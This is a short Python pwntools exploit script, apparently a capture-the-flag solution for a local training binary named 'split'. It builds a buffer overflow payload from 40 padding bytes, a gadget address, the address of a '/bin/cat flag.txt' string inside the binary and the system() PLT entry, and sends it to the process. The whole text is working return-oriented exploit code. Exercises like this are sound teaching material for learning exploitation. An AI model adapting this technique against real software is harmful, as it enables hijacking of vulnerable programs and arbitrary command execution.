from pwn import *
from time import sleep

elf = ELF('./split')
p = process('./split')

payload = 'A'*40+p64(0x400883)+p64(elf.search('/bin/cat flag.txt').next())+p64(elf.plt['system'])
print p.recv()
p.sendline(payload)
print p.recv()
